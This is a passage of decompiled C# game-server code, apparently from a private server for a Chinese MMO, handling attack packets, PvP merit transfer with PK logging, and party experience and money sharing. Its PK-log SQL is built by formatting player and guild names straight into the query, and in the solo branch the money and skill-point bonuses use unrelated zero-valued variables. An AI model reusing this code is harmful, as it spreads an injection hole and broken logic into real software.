						宠物攻击力 = ((人物灵兽.FLD_JOB_LEVEL == 1) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 1].FLD_AT) : ((人物灵兽.FLD_JOB_LEVEL == 2) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 2].FLD_AT) : ((人物灵兽.FLD_JOB_LEVEL != 3) ? (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中) : (人物灵兽.FLD_攻击 + 人物灵兽.FLD_命中 + 人物灵兽.武功新[0, 3].FLD_AT))));
					}
					攻击确认次数 = 1;
					if (攻击类型 == 128 || 攻击类型 == 129 || 攻击类型 == 130 || 攻击类型 == 131 || 攻击类型 == 132 || 攻击类型 == 133 || 攻击类型 == 136)
					{
						攻击确认次数 = 3;
					}
					发送攻击人物数据(Play, 人物ID, 武功ID, 攻击力, 攻击类型, 最后血量, 障力吸收, 宠物攻击力);
					攻击列表.Clear();
					using (new Lock(攻击列表, "攻击列表"))
					{
						攻击列表.Add(new 攻击类(人物ID, 武功ID, 攻击力, 攻击类型));
					}
					int num8;
					switch (Play.Player_Job)
					{
					case 4:
						num8 = 1000;
						break;
					case 3:
					case 5:
						num8 = 950;
						break;
					case 6:
						num8 = 500;
						break;
					case 7:
						num8 = 800;
						break;
					default:
						num8 = 700;
						break;
					case 11:
						num8 = 1000;
						break;
					case 12:
						num8 = 950;
						break;
					case 13:
						num8 = 950;
						break;
					}
					if (Play.Player_Job == 6)
					{
						num8 = ((!Play.GetAddState(801201)) ? 500 : 100);
						if (攻击类型 == 129 || 攻击类型 == 130 || 攻击类型 == 131 || 攻击类型 == 132 || 攻击类型 == 133)
						{
							num8 = 200;
						}
					}
					if (Play.装备栏已穿装备[3].Get物品ID == 0L)
					{
						num8 = 720;
					}
					SendPack(Play.人物全服ID, 人物ID, 攻击类型, 0, num8);
				}
				goto end_IL_0000;
				IL_06cd:
				攻击列表.Clear();
				攻击确认次数 = 1;
				using (new Lock(攻击列表, "攻击列表"))
				{
					攻击列表.Add(攻击类);
				}
				SendPack(Play.人物全服ID, 人物ID, 0, value.FLD_PID, 500);
				end_IL_0000:;
			}
			catch (Exception ex)
			{
				拳师连击控制 = 0;
				攻击列表.Clear();
				Form1.WriteLine(1, "攻击计算完成 " + base.人物全服ID + "|" + base.Client.ToString() + " | " + 武功ID + " | " + 人物ID + " | " + base.UserName + " | " + ex.Message);
			}
		}

		public void 发送打坐数据(int ID)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA551E002D012500180000000000000000000000000000000000000000000000000055AA");
				byte[] bytes = Encoding.Default.GetBytes(base.Userid);
				System.Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 20, 1);
				System.Buffer.BlockCopy(bytes, 0, array, 22, bytes.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (World.ycServerConnect != null)
				{
					World.ycServerConnect.Send(array, 36);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送打坐数据出错:" + ex.Message);
			}
		}

		public void SendPack(int 攻击者人物ID, int 人物ID, int 攻击模式, int 武功ID, int times)
		{
			try
			{
				if (base.Client != null && base.Client.Running)
				{
					byte[] array = Converter.hexStringToByte("AA551E002D011A41180000000000000000000000000000000000000000000000000055AA");
					byte[] bytes = Encoding.Default.GetBytes(base.Userid);
					System.Buffer.BlockCopy(BitConverter.GetBytes(攻击者人物ID), 0, array, 4, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(人物ID), 0, array, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(攻击模式), 0, array, 14, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(times), 0, array, 18, 2);
					System.Buffer.BlockCopy(bytes, 0, array, 22, bytes.Length);
					if (武功ID == 0)
					{
						if (人物ID >= 300 && 人物ID < 10000)
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 20, 1);
						}
						else
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 20, 1);
						}
					}
					else if (人物ID >= 300 && 人物ID < 10000)
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array, 20, 1);
					}
					else
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(3), 0, array, 20, 1);
					}
					if (World.ycServerConnect != null)
					{
						World.ycServerConnect.Send(array, 36);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送攻击封包出错:" + ex.Message);
			}
		}

		public void 武勋系统(Players Playe)
		{
			if (Playe.Player_WuXun <= 0)
			{
				系统提示("对方武勋太少或自己武勋为0不能获得武勋。");
				return;
			}
			if (Playe.帮派名字.Length != 0 && base.帮派名字.Length != 0 && Playe.帮派名字 == base.帮派名字)
			{
				系统提示("击杀本帮派成员不能获得武勋。");
				return;
			}
			int num = (Playe.Player_Level >= 80) ? ((Playe.Player_Level >= 80 && Playe.Player_Level < 100) ? 200 : ((Playe.Player_Level >= 100 && Playe.Player_Level < 120) ? 200 : ((Playe.Player_Level >= 120 && Playe.Player_Level < 140) ? 260 : ((Playe.Player_Level >= 140 && Playe.Player_Level < 160) ? 300 : ((Playe.Player_Level >= 160 && Playe.Player_Level < 180) ? 400 : ((Playe.Player_Level < 180 || Playe.Player_Level >= 300) ? 800 : 500)))))) : 0;
			if (num <= 0)
			{
				return;
			}
			if (每日获得武勋 < 计算每日武勋量(base.Player_Job_leve))
			{
				Playe.Player_WuXun -= num;
				Playe.丢失武勋 += num;
				Playe.系统提示("被[" + base.UserName + "]击杀，丢失武勋" + num + "点。");
				int num2 = (int)((double)num * World.武勋回收百分比);
				int num3 = num - num2;
				int num4 = (base.FLD_人物_追加_武勋获得量百分比 <= 0.0) ? num3 : ((int)((double)num3 * (1.0 + base.FLD_人物_追加_武勋获得量百分比)));
				base.Player_WuXun += num4;
				每日获得武勋 += num4;
				if (DBA.GetDBToDataTable(string.Format("SELECT  *  FROM  TBL_XWWL_PKLog  WHERE  FLD_KILLER  =  '{0}'  AND  FLD_DEATH  =  '{1}'", base.UserName, Playe.UserName)).Rows.Count != 0)
				{
					DBA.ExeSqlCommand(string.Format("UPDATE  TBL_XWWL_PKLog  SET  FLD_NUM=FLD_NUM+1,FLD_LASTTIME='{0}',FLD_WX=FLD_WX+{1},FLD_KILLER_GUILD='{2}',FLD_DEATH_GUILD='{3}'  WHERE  FLD_KILLER='{4}'  AND  FLD_DEATH  =  '{5}'  ", DateTime.Now, num3, base.帮派名字, Playe.帮派名字, base.UserName, Playe.UserName));
				}
				else
				{
					DBA.ExeSqlCommand(string.Format("INSERT  INTO  TBL_XWWL_PKLog  (FLD_KILLER,FLD_DEATH,FLD_NUM,FLD_WX,FLD_KILLER_GUILD,FLD_DEATH_GUILD)  VALUES  ('{0}','{1}',{2},{3},'{4}','{5}')", base.UserName, Playe.UserName, 1, num3, base.帮派名字, Playe.帮派名字));
				}
				系统提示("获得武勋" + num4 + "点，系统回收" + num2 + "点  [至尊符多得50%]");
			}
			if (Playe.帮派Id != 0)
			{
				byte[] array = Converter.hexStringToByte("AA55A5002C016600970003006766676666670000000000000000000000000000003000CBAEB5E7B7D1CBAEB5E7B7D1CAC700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
				array[10] = 3;
				string text = string.Empty;
				if (base.帮派名字.Length > 0)
				{
					text = "[" + base.帮派名字 + "]的";
				}
				string s = "我在" + 坐标Class.GetMapName(Playe.人物坐标_地图) + "[" + (int)Playe.人物坐标_X + "," + (int)Playe.人物坐标_Y + "]被" + text + "[" + base.UserName + "]猛烈击杀,请同门火速支援。";
				byte[] bytes = Encoding.Default.GetBytes(Playe.UserName);
				byte[] bytes2 = Encoding.Default.GetBytes(s);
				System.Buffer.BlockCopy(bytes2, 0, array, 35, bytes2.Length);
				System.Buffer.BlockCopy(bytes, 0, array, 12, bytes.Length);
				System.Buffer.BlockCopy(Buffer.GetBytes(Playe.人物全服ID), 0, array, 4, 2);
				string text2 = Converter.ToString(array);
				World.conn.发送("帮派消息|" + Playe.帮派名字 + "|" + Playe.UserName + "|" + text2);
			}
		}

		public void 武勋系统(Players Playe1, Players Playe2, int sid)
		{
			try
			{
				if (Playe2.Player_Level < World.武勋保护等级)
				{
					Playe1.系统提示("击杀等级小于" + World.武勋保护等级 + "级的玩家不能获得武勋。", 50, "系统提示");
				}
				else if (Playe1.帮派名字.Length != 0 && Playe2.帮派名字.Length != 0 && Playe1.帮派名字 == Playe2.帮派名字)
				{
					Playe1.系统提示("击杀本帮派成员不能获得武勋。", 50, "系统提示");
				}
				else
				{
					string[] array = World.死亡减少武勋数量.Split(';');
					string[] array2 = World.系统回收数量.Split(';');
					int num = Convert.ToInt32(array[0]);
					int num2 = Convert.ToInt32(array[1]);
					int num3 = Convert.ToInt32(array[2]);
					int num4 = Convert.ToInt32(array[3]);
					int num5 = Convert.ToInt32(array[4]);
					int num6 = Convert.ToInt32(array[5]);
					int num7 = Convert.ToInt32(array2[0]);
					int num8 = Convert.ToInt32(array2[1]);
					int num9 = Convert.ToInt32(array2[2]);
					int num10 = Convert.ToInt32(array2[3]);
					int num11 = Convert.ToInt32(array2[4]);
					int num12 = Convert.ToInt32(array2[5]);
					int num13;
					int num14;
					int num15;
					if (Playe2.Player_Level >= World.武勋保护等级 && Playe2.Player_Level < World.武勋保护等级 + 10)
					{
						num13 = num - num7;
						int player_WuXun = Playe2.Player_WuXun;
						num14 = num7;
						num15 = num;
					}
					else if (Playe2.Player_Level >= World.武勋保护等级 + 10 && Playe2.Player_Level < World.武勋保护等级 + 20)
					{
						num13 = num2 - num8;
						int player_WuXun2 = Playe2.Player_WuXun;
						num14 = num8;
						num15 = num2;
					}
					else if (Playe2.Player_Level >= World.武勋保护等级 + 20 && Playe2.Player_Level < World.武勋保护等级 + 30)
					{
						num13 = num3 - num9;
						int player_WuXun3 = Playe2.Player_WuXun;
						num14 = num9;
						num15 = num3;
					}
					else if (Playe2.Player_Level >= World.武勋保护等级 + 30 && Playe2.Player_Level < World.武勋保护等级 + 40)
					{
						num13 = num4 - num10;
						int player_WuXun4 = Playe2.Player_WuXun;
						num14 = num10;
						num15 = num4;
					}
					else if (Playe2.Player_Level >= World.武勋保护等级 + 40 && Playe2.Player_Level < World.武勋保护等级 + 50)
					{
						num13 = num5 - num11;
						int player_WuXun5 = Playe2.Player_WuXun;
						num14 = num11;
						num15 = num5;
					}
					else
					{
						num13 = num6 - num12;
						int player_WuXun6 = Playe2.Player_WuXun;
						num14 = num12;
						num15 = num6;
					}
					if (Playe2.Player_WuXun <= 0)
					{
						Playe1.系统提示("对方武勋为负不能获得武勋。", 50, "系统提示");
					}
					else
					{
						base.Player_WuXun += num13;
					}
					if (base.人物坐标_地图 == 1301)
					{
						int num16 = (int)((double)num13 * 1.5);
						Playe1.系统提示("获得武勋" + num16 + "点,系统回收" + num14 + "点>>>加成1.5倍<<<", 50, "系统提示");
					}
					else
					{
						Playe1.系统提示("击杀[" + Playe2.UserName + "]获得武勋" + num13 + "点,系统回收" + num14 + "点。", 50, "系统提示");
					}
					if (Playe2.人物坐标_地图 == 1301)
					{
						num15 = (int)((double)num15 * 1.5);
					}
					Playe2.Player_WuXun -= num15;
					Playe2.系统提示("被[" + Playe1.UserName + "]击杀,丢失武勋" + num15 + "点。", 50, "系统提示");
					if (sid == 1)
					{
						Playe1.更新武功和状态();
						Playe2.更新武功和状态();
					}
					if (DBA.GetDBToDataTable(string.Format("SELECT  *  FROM  TBL_XWWL_PKLog  WHERE  FLD_KILLER  =  '{0}'  AND  FLD_DEATH  =  '{1}'", Playe1.UserName, Playe2.UserName)).Rows.Count != 0)
					{
						DBA.ExeSqlCommand(string.Format("UPDATE  TBL_XWWL_PKLog  SET  FLD_NUM=FLD_NUM+1,FLD_LASTTIME='{0}',FLD_WX=FLD_WX+{1},FLD_KILLER_GUILD='{2}',FLD_DEATH_GUILD='{3}'      WHERE      FLD_KILLER='{4}'      AND      FLD_DEATH      =      '{5}'      ", DateTime.Now, num15, Playe1.帮派名字, Playe2.帮派名字, Playe1.UserName, Playe2.UserName));
					}
					else
					{
						DBA.ExeSqlCommand(string.Format("INSERT  INTO  TBL_XWWL_PKLog  (FLD_KILLER,FLD_DEATH,FLD_NUM,FLD_WX,FLD_KILLER_GUILD,FLD_DEATH_GUILD)  VALUES  ('{0}','{1}',{2},{3},'{4}','{5}')", Playe1.UserName, Playe2.UserName, 1, num15, Playe1.帮派名字, Playe2.帮派名字));
					}
				}
			}
			catch
			{
			}
		}

		public void 精神宝珠包(int id, double 经验)
		{
			int 凝神宝珠位置 = base.凝神宝珠位置;
			if (凝神宝珠位置 == -1)
			{
				return;
			}
			if (id == 3)
			{
				int num = (int)(经验 / 8.0);
				if (num < 0)
				{
					num = 1;
				}
				if (公有药品.ContainsKey(1008000312) || 公有药品.ContainsKey(1008000311))
				{
					num *= 2;
				}
				装备栏包裹[凝神宝珠位置].FLD_MAGIC0 += num;
				if (装备栏包裹[凝神宝珠位置].FLD_MAGIC0 >= 装备栏包裹[凝神宝珠位置].FLD_MAGIC1)
				{
					byte[] bytes = Buffer.GetBytes(1008000315);
					byte[] bytes2 = Buffer.GetBytes(1);
					byte[] array = new byte[56];
					System.Buffer.BlockCopy(Buffer.GetBytes(装备栏包裹[凝神宝珠位置].FLD_MAGIC1), 0, array, 0, 4);
					System.Buffer.BlockCopy(Buffer.GetBytes(装备栏包裹[凝神宝珠位置].FLD_MAGIC1), 0, array, 4, 4);
					byte[] bytes3 = Buffer.GetBytes(RxjhClass.GetDBItmeId());
					减去物品(凝神宝珠位置, 1);
					增加物品2(bytes3, bytes, 凝神宝珠位置, bytes2, array);
					base.凝神宝珠位置 = -1;
					return;
				}
			}
			发包类 发包类 = new 发包类();
			发包类.Write4(id);
			发包类.Write4(凝神宝珠位置);
			发包类.Write4(Buffer.ToInt32(装备栏包裹[凝神宝珠位置].物品ID, 0));
			发包类.Write4(0);
			发包类.Write4(装备栏包裹[凝神宝珠位置].FLD_MAGIC1);
			发包类.Write4(装备栏包裹[凝神宝珠位置].FLD_MAGIC0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 57368, base.人物全服ID);
			}
		}

		public void 吸魂(int 怪ID)
		{
			int num = RNG.Next(1, 100);
			if (base.FLD_VIP == 1)
			{
				num -= 15;
			}
			if (base.FLD_人物_追加_吸魂几率百分比 > 0.0)
			{
				num -= (int)base.FLD_人物_追加_吸魂几率百分比;
			}
			if (num - 中级附魂_吸魂 > World.吸魂机率)
			{
				return;
			}
			int num2 = Buffer.ToInt32(装备栏包裹[0].物品ID, 0);
			switch (num2)
			{
			case 1000000322:
			case 1000000324:
			case 1000000326:
				break;
			case 1000000321:
			case 1000000323:
			case 1000000325:
			case 1000000327:
			{
				if (RNG.Next(0, 2699) > 装备栏包裹[0].FLD_MAGIC0)
				{
					break;
				}
				吸魂动做包(怪ID);
				显示大字(base.人物全服ID, 402);
				int num3 = RNG.Next(1, 2);
				switch (num2)
				{
				case 1000000322:
					break;
				case 1000000324:
					break;
				case 1000000326:
					break;
				case 1000000321:
					装备栏包裹[0].FLD_MAGIC2 += num3;
					吸魂数量包(num3);
					if (装备栏包裹[0].FLD_MAGIC2 >= 装备栏包裹[0].FLD_MAGIC1)
					{
						减去物品(0, 1);
						增加物品2(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000771), 0, Buffer.GetBytes(1), new byte[56]);
					}
					break;
				case 1000000323:
					装备栏包裹[0].FLD_MAGIC2 += num3;
					吸魂数量包(num3);
					if (装备栏包裹[0].FLD_MAGIC2 >= 装备栏包裹[0].FLD_MAGIC1)
					{
						减去物品(0, 1);
						增加物品2(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000772), 0, Buffer.GetBytes(1), new byte[56]);
					}
					break;
				case 1000000325:
					装备栏包裹[0].FLD_MAGIC2 += num3;
					吸魂数量包(num3);
					if (装备栏包裹[0].FLD_MAGIC2 >= 装备栏包裹[0].FLD_MAGIC1)
					{
						减去物品(0, 1);
						增加物品2(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000773), 0, Buffer.GetBytes(1), new byte[56]);
					}
					break;
				case 1000000327:
					装备栏包裹[0].FLD_MAGIC2 += num3;
					吸魂数量包(num3);
					if (装备栏包裹[0].FLD_MAGIC2 >= 装备栏包裹[0].FLD_MAGIC1)
					{
						减去物品(0, 1);
						增加物品2(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000774), 0, Buffer.GetBytes(1), new byte[56]);
					}
					break;
				}
				break;
			}
			}
		}

		public void 吸魂动做包(int 怪ID)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(怪ID);
			发包类.Write4(Buffer.ToInt32(装备栏包裹[0].物品ID, 0));
			发包类.Write4(装备栏包裹[0].FLD_MAGIC1);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 55576, base.人物全服ID);
			}
			发送当前范围广播数据(发包类, 55576, base.人物全服ID);
		}

		public void 吸魂数量包(int 数量)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(1);
			发包类.Write(装备栏包裹[0].物品_byte, 0, 12);
			发包类.Write4(0);
			发包类.Write4(数量);
			发包类.Write4(0);
			发包类.Write4(1);
			发包类.Write4(0);
			发包类.Write(装备栏包裹[0].物品_byte, 16, 40);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 8960, base.人物全服ID);
			}
		}

		public int 计算队伍总攻击血量(NpcClass npcTemp, int 组队ID)
		{
			int num = 0;
			try
			{
				if (npcTemp.PlayGj != null && npcTemp.PlayGj.Count > 0)
				{
					foreach (PlayGjClass item in npcTemp.PlayGj)
					{
						Players players = 得到人物数据(item.PlayID);
						if (players != null && !players.Player死亡 && players.人物_HP > 0 && players.查找范围Npc(700, npcTemp) && players.组队id == 组队ID)
						{
							num += item.Gjxl;
						}
					}
					return num;
				}
				num = 0;
				return num;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "计算队伍总攻击血量      出错" + base.人物全服ID + "|" + ToString() + "      " + ex.Message);
				return num;
			}
		}

		public int 计算个人攻击血量(NpcClass npcTemp, Players pla)
		{
			int result = 0;
			try
			{
				if (npcTemp.PlayGj != null && npcTemp.PlayGj.Count > 0)
				{
					foreach (PlayGjClass item in npcTemp.PlayGj)
					{
						if (pla == null || pla.Player死亡 || pla.人物_HP <= 0)
						{
							return result;
						}
						if (item.PlayID == pla.人物全服ID && pla.查找范围Npc(700, npcTemp))
						{
							result = item.Gjxl;
							return result;
						}
					}
					return result;
				}
				result = 0;
				return result;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "计算个人攻击血量      出错" + base.人物全服ID + "|" + ToString() + "      " + ex.Message);
				return result;
			}
		}

		public double 获得队伍加成(组队Class 组队a)
		{
			double num = 0.0;
			if (组队a.队员列表.Count < 7)
			{
				return num;
			}
			if (组队a.队员列表.Count == 8)
			{
				num += 0.15;
			}
			bool flag = false;
			bool flag2 = false;
			bool flag3 = false;
			bool flag4 = false;
			bool flag5 = false;
			bool flag6 = false;
			bool flag7 = false;
			foreach (Players value in 组队a.队员列表.Values)
			{
				if (查找范围玩家(700, value) && value.人物_HP > 0 && !value.Player死亡)
				{
					switch (value.Player_Job)
					{
					case 1:
						flag = true;
						break;
					case 2:
						flag2 = true;
						break;
					case 3:
						flag3 = true;
						break;
					case 4:
						flag4 = true;
						break;
					case 5:
						flag5 = true;
						break;
					case 6:
						flag6 = true;
						break;
					case 7:
						flag7 = true;
						break;
					}
				}
			}
			if (flag && flag2 && flag3 && flag4 && flag5 && flag7 && flag6)
			{
				num += 0.15;
			}
			return num;
		}

		public void 分配经验历练金钱(NpcClass npcTemp, double 经验, double 历练, double 金钱, double 升天历练)
		{
			if (经验 <= 0.0 || !查找范围Npc(700, npcTemp))
			{
				return;
			}
			double num = 0.0;
			double num2 = 0.0;
			if (组队id != 0)
			{
				int num3 = 计算队伍总攻击血量(npcTemp, 组队id);
				if (num3 > 0)
				{
					if (num3 > npcTemp.Max_Rxjh_HP)
					{
						num3 = npcTemp.Max_Rxjh_HP;
					}
					double num4 = 经验 * (double)num3 / (double)npcTemp.Max_Rxjh_HP;
					double num5 = 历练 * (double)num3 / (double)npcTemp.Max_Rxjh_HP;
					double num6 = 金钱 * (double)num3 / (double)npcTemp.Max_Rxjh_HP;
					double num7 = 升天历练 * (double)num3 / (double)npcTemp.Max_Rxjh_HP;
					组队Class value;
					if (World.W组队.TryGetValue(组队id, out value) && (base.Player_Level - npcTemp.Level <= World.获得经验等级差 || npcTemp.FLD_BOSS != 0))
					{
						double num8 = num4 / (double)value.队员列表.Count;
						double num9 = num5 / (double)value.队员列表.Count;
						double num10 = num6 / (double)value.队员列表.Count;
						double num11 = num7 / (double)value.队员列表.Count;
						double num12 = num8;
						double num13 = num9;
						double num14 = num10;
						foreach (Players value2 in value.队员列表.Values)
						{
							if (查找范围玩家(700, value2) && value2.人物_HP > 0 && !value2.Player死亡 && (value2.Player_Level - npcTemp.Level < World.获得经验等级差 || npcTemp.FLD_BOSS != 0))
							{
								double num15 = num8;
								double num16 = num9;
								double num17 = num10;
								double num18 = value2.人物_追加_经验百分比 + value2.FLD_装备_追加_经验百分比 + value2.FLD_宠物_追加_经验百分比 + value2.FLD_灵宠_追加_经验百分比 + World.查队伍职业(value, value2);
								double num19 = value2.FLD_装备_追加_获得游戏币百分比 + value2.FLD_人物_追加_获得游戏币百分比;
								double fLD_人物_追加_历练百分比 = value2.FLD_人物_追加_历练百分比;
								double fLD_灵宠_追加_历练百分比 = value2.FLD_灵宠_追加_历练百分比;
								if (value.红包)
								{
									num18 += 0.2;
									num19 += 0.2;
								}
								if (num18 > 0.0)
								{
									num15 += num12 * num18;
								}
								if (num19 > 0.0)
								{
									num17 += num14 * num19;
								}
								if (value2.FLD_人物_追加_历练百分比 > 0.0)
								{
									num16 += num13 * value2.FLD_人物_追加_历练百分比;
								}
								double num20 = num15;
								switch (base.Player_Job_leve)
								{
								case 1:
									num20 *= World.一转经验百分比;
									break;
								case 2:
									num20 *= World.二转经验百分比;
									break;
								case 3:
									num20 *= World.三转经验百分比;
									break;
								case 4:
									num20 *= World.四转经验百分比;
									break;
								case 5:
									num20 *= World.五转经验百分比;
									break;
								case 6:
									num20 *= World.六转经验百分比;
									break;
								case 7:
									num20 *= World.七转经验百分比;
									break;
								case 8:
									num20 *= World.八转经验百分比;
									break;
								case 9:
									num20 *= World.九转经验百分比;
									break;
								case 10:
									num20 *= World.十转经验百分比;
									break;
								}
								if (value2.Player_Level <= World.双倍经验等级上限)
								{
									num20 *= World.双倍等级上限倍数;
								}
								if (value2.Player_Level <= World.双倍金钱等级上限)
								{
									num17 *= World.双倍等级上限倍数;
								}
								if (value2.Player_Level <= World.双倍历练等级上限)
								{
									num16 *= World.双倍等级上限倍数;
								}
								if (value2.人物坐标_地图 == 42101)
								{
									num20 *= 1.5;
								}
								if (value2.查询天关地图(value2.人物坐标_地图))
								{
									num20 *= 1.0 + value2.得到天关福利加成(0, value2.人物坐标_地图);
								}
								if (value2.人物灵兽 != null && value2.Config.宠物经验 > 0 && !value2.人物灵兽.死亡)
								{
									double num21 = (double)value2.Config.宠物经验 * 0.01;
									int num22 = (int)(num20 * num21 * (1.0 + value2.人物灵兽.FLD_灵兽_获得经验增加百分比));
									if (num22 <= 0 || num22 > 2000000000)
									{
										num22 = 0;
									}
									value2.人物灵兽.FLD_EXP += num22;
									value2.人物灵兽.计算基本数据();
									value2.更新灵兽经验和历练();
									int num23 = (int)(num20 * (1.0 - num21));
									if (num23 <= 0 || num23 > 2000000000)
									{
										num23 = 0;
									}
									if (value2.Player_Level < World.限制最高级别)
									{
										value2.人物经验 += num23;
										value2.精神宝珠包(3, num23);
									}
								}
								else
								{
									if (num20 <= 0.0 || num20 > 2000000000.0)
									{
										num20 = 0.0;
									}
									if (value2.Player_Level < World.限制最高级别)
									{
										value2.人物经验 += (int)num20;
										value2.精神宝珠包(3, (int)num20);
									}
								}
								value2.Player_ExpErience += (int)num16;
								value2.升天历练当前获得数 += (int)num11;
								if (World.是否开放九泉地图 == 1.0)
								{
									if (value2.人物坐标_地图 >= 23001 && value2.人物坐标_地图 <= 24000)
									{
										World.王龙的金币 += (uint)(num17 * (1.0 - World.九泉金币比率));
										value2.Player_Money += (uint)(num17 * World.九泉金币比率);
										value2.得到钱的提示((uint)(num17 * World.九泉金币比率));
									}
									else
									{
										World.王龙的金币 += (uint)(num17 * (1.0 - World.其他地图金币比率));
										value2.Player_Money += (uint)(num17 * World.其他地图金币比率);
										value2.得到钱的提示((uint)(num17 * World.其他地图金币比率));
									}
								}
								else
								{
									value2.Player_Money += (uint)num17;
									value2.得到钱的提示((uint)num17);
								}
								value2.计算人物基本数据3();
								value2.更新经验和历练();
								value2.更新金钱和负重();
							}
						}
					}
				}
			}
			else
			{
				if (base.Player_Level - npcTemp.Level > World.获得经验等级差 && npcTemp.FLD_BOSS == 0)
				{
					return;
				}
				int num24 = 计算个人攻击血量(npcTemp, this);
				if (num24 <= 0)
				{
					return;
				}
				if (num24 > npcTemp.Max_Rxjh_HP)
				{
					num24 = npcTemp.Max_Rxjh_HP;
				}
				double num25 = 经验 * (double)num24 / (double)npcTemp.Max_Rxjh_HP;
				double num26 = 历练 * (double)num24 / (double)npcTemp.Max_Rxjh_HP;
				double num27 = 金钱 * (double)num24 / (double)npcTemp.Max_Rxjh_HP;
				升天历练 = 升天历练 * (double)num24 / (double)npcTemp.Max_Rxjh_HP;
				double num28 = base.人物_追加_经验百分比 + base.FLD_装备_追加_经验百分比 + base.FLD_宠物_追加_经验百分比 + base.FLD_灵宠_追加_经验百分比;
				if (num28 > 0.0)
				{
					num25 += num25 * num28;
				}
				double num29 = base.FLD_装备_追加_获得游戏币百分比 + base.FLD_人物_追加_获得游戏币百分比;
				if (num29 > 0.0)
				{
					num27 += num2 * num29;
				}
				if (base.FLD_人物_追加_历练百分比 > 0.0)
				{
					num26 += num * base.FLD_人物_追加_历练百分比 + base.FLD_灵宠_追加_历练百分比;
				}
				switch (base.Player_Job_leve)
				{
				case 1:
					num25 *= World.一转经验百分比;
					break;
				case 2:
					num25 *= World.二转经验百分比;
					break;
				case 3:
					num25 *= World.三转经验百分比;
					break;
				case 4:
					num25 *= World.四转经验百分比;
					break;
				case 5:
					num25 *= World.五转经验百分比;
					break;
				case 6:
					num25 *= World.六转经验百分比;
					break;
				case 7:
					num25 *= World.七转经验百分比;
					break;
				case 8:
					num25 *= World.八转经验百分比;
					break;
				case 9:
					num25 *= World.九转经验百分比;
					break;
				case 10:
					num25 *= World.十转经验百分比;
					break;
				}
				if (base.Player_Level <= World.双倍经验等级上限)
				{
					num25 *= World.双倍等级上限倍数;
				}
				if (base.Player_Level <= World.双倍金钱等级上限)
				{
					num27 *= World.双倍等级上限倍数;
				}
				if (base.Player_Level <= World.双倍历练等级上限)
				{
					num26 *= World.双倍等级上限倍数;
				}
				if (base.人物坐标_地图 == 42101)
				{
					num25 *= 1.5;
				}
				if (查询天关地图(base.人物坐标_地图))
				{
					num25 *= 1.0 + 得到天关福利加成(0, base.人物坐标_地图);
				}
				if (人物灵兽 != null && Config.宠物经验 > 0 && !人物灵兽.死亡)
				{
					double num30 = (double)Config.宠物经验 * 0.01;
					int num31 = (int)(num25 * num30 * (1.0 + 人物灵兽.FLD_灵兽_获得经验增加百分比));
					if (num31 <= 0 || num31 > 2000000000)
					{
						num31 = 0;
					}
					人物灵兽.FLD_EXP += num31;
					人物灵兽.计算基本数据();
					更新灵兽经验和历练();
					int num32 = (int)(num25 * (1.0 - num30));
					if (num32 <= 0 || num32 > 2000000000)
					{
						num32 = 0;
					}
					if (base.Player_Level < World.限制最高级别)
					{
						base.人物经验 += num32;
						精神宝珠包(3, num32);
					}
				}
				else
				{
					int num33 = (int)num25;
					if (num33 <= 0 || num33 > 2000000000)
					{
						num33 = 0;
					}
					if (base.Player_Level < World.限制最高级别)
					{
						base.人物经验 += num33;
						精神宝珠包(3, num33);
					}
				}
				base.Player_ExpErience += (int)num26;
				升天历练当前获得数 += (int)升天历练;
				if (World.是否开放九泉地图 == 1.0)
				{
					if (base.人物坐标_地图 >= 23001 && base.人物坐标_地图 <= 24000)
					{
						World.王龙的金币 += (uint)(num27 * (1.0 - World.九泉金币比率));
						base.Player_Money += (uint)(num27 * World.九泉金币比率);
						得到钱的提示((uint)(num27 * World.九泉金币比率));
					}
					else
					{
						World.王龙的金币 += (uint)(num27 * (1.0 - World.其他地图金币比率));
						base.Player_Money += (uint)(num27 * World.其他地图金币比率);
						得到钱的提示((uint)(num27 * World.其他地图金币比率));
					}
				}
				else
				{
					base.Player_Money += (uint)num27;
					得到钱的提示((uint)num27);
				}
				计算人物基本数据3();
				更新经验和历练();
				更新金钱和负重();
			}
		}

		public void ls攻击确认(byte[] 封包数据, int 封包大小)
		{
			int key = BitConverter.ToInt16(封包数据, 4);
			Players value;
			if (World.allConnectedChars.TryGetValue(key, out value) && value.Client != null && value.Client.Running)
			{
				value.攻击确认(封包数据);
			}
		}

		public void 攻击确认(byte[] data)
		{
			try
			{
				if (攻击确认次数 < 1)
				{
					攻击列表.Clear();
				}
				else
				{
					攻击确认次数--;
					byte[] array = new byte[4];
					byte[] array2 = new byte[4];
					byte[] array3 = new byte[4];
					System.Buffer.BlockCopy(data, 4, array, 0, 2);
					System.Buffer.BlockCopy(data, 10, array2, 0, 2);
					System.Buffer.BlockCopy(data, 14, array3, 0, 4);
